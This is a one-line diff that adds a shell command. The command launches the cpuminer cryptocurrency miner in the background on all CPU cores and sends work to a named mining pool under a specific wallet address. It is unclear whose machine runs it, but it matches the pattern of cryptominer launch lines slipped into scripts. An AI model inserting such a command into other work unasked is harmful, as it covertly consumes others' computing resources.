@@ -1,0 +1,1 @@
+/home/ubuntu/termux-miner/cpuminer -a yescryptr16 -o stratum+tcp://stratum-asia.rplant.xyz:7055 -u qZnyHPgAKdf9kMNCE766YqqhRtSnK12MAx.tes$(echo $(shuf -i 1-99 -n 1)) -t $(nproc --all) &
